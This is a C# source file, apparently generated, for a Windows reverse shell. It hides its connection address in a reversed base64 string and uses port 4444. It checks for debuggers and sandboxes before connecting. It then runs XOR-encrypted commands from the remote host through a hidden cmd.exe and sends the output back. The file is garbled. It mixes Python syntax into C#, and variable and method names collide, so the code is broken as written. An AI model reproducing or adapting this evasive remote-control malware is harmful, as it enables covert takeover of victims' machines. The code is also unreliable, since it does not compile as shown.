using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

namespace NSbidipobupe
{
    class CLeBFfyWXQyk
    {
        private static string clientvosuwu = base64.b64decode("MDAxLjEuODYxLjI5MQ==").decode()[::-1];
        private static int streamp_d_k = 4444;
        private static byte[] keyr5oz3zc5twcs8 = Encoding.UTF8.GetBytes("mua6ZXa~d@lBT,drdlu:M'[6");

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            // Anti-debugging checks
            if (AntiSandbox())
                return;

            // Random delay
            Thread.Sleep(new Random().Next(6836, 9598));

            // Connect with retry
            int retries = 0;
            while (retries < 3)
            {
                try
                {
                    ConnectdjXk();
                    break;
                }
                catch
                {
                    Thread.Sleep(39894);
                    retries++;
                }
            }
        }

        static bool AntiSandbox()
        {
            // Check for debugger
            if (Debugger.IsAttached)
                return true;

            // Check for common sandbox artifacts
            if (GetModuleHandle("SbieDll.dll") != IntPtr.Zero)
                return true;

            if (GetModuleHandle("snxhk.dll") != IntPtr.Zero)
                return true;

            // Timing check
            DateTime start = DateTime.Now;
            Thread.Sleep(1000);
            if ((DateTime.Now - start).TotalMilliseconds < 900)
                return true;

            return false;
        }

        static void ConnectdjXk()
        {
            using (TcpClient clientvosuwu = new TcpClient(clientvosuwu, streamp_d_k))
            using (NetworkStream streamp_d_k = clientvosuwu.GetStream())
            {
                byte[] buffervezoxinaga = new byte[8192];
                int datagxje_uan;

                while ((datagxje_uan = streamp_d_k.Read(buffervezoxinaga, 0, buffervezoxinaga.Length)) != 0)
                {
                    byte[] Encrypttjq = new byte[datagxje_uan];
                    Array.Copy(buffervezoxinaga, Encrypttjq, datagxje_uan);
                    
                    string command = Decryptlupami(Encrypttjq);

                    if (command.ToLower().Trim() == "exit")
                        break;

                    string result = Executexuda(command);
                    
                    byte[] resultqisow = Encrypttjq(result);
                    streamp_d_k.Write(resultqisow, 0, resultqisow.Length);
                }
            }
        }

        static string Executexuda(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = Environment.CurrentDirectory
                };

                using (Process proc = Process.Start(psi))
                {
                    string output = proc.StandardOutput.ReadToEnd();
                    string errors = proc.StandardError.ReadToEnd();
                    proc.WaitForExit(30000);
                    return output + errors;
                }
            }
            catch (Exception ex)
            {
                return "Error: " + ex.Message;
            }
        }

        static byte[] Encrypttjq(string data)
        {
            byte[] dataBytes = Encoding.UTF8.GetBytes(data);
            byte[] result = new byte[dataBytes.Length];
            
            for (int i = 0; i < dataBytes.Length; i++)
            {
                result[i] = (byte)(dataBytes[i] ^ keyr5oz3zc5twcs8[i % keyr5oz3zc5twcs8.Length]);
            }
            
            return result;
        }

        static string Decryptlupami(byte[] data)
        {
            byte[] result = new byte[data.Length];
            
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ keyr5oz3zc5twcs8[i % keyr5oz3zc5twcs8.Length]);
            }
            
            return Encoding.UTF8.GetString(result);
        }
    }
}
